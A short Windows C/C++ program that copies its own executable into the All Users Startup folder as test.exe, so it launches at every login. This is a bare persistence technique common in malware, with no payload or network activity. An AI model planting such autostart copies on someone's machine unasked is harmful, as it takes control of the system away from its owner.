#include<stdio.h>
#include<windows.h>
int main(){
	char fileName[MAX_PATH];
	char destFile[MAX_PATH];
	char sysPath[MAX_PATH];
	::GetSystemDirectory(sysPath,sizeof(sysPath));
	::GetModuleFileName(NULL,fileName,sizeof(fileName));
	sprintf(destFile,"%c%c\\Documents and Settings\\All Users\\Start Menu\\All Programs\\Startup\\test.exe",sysPath[0],sysPath[1]);
	::CopyFile(fileName,destFile,TRUE);
	return 0;
}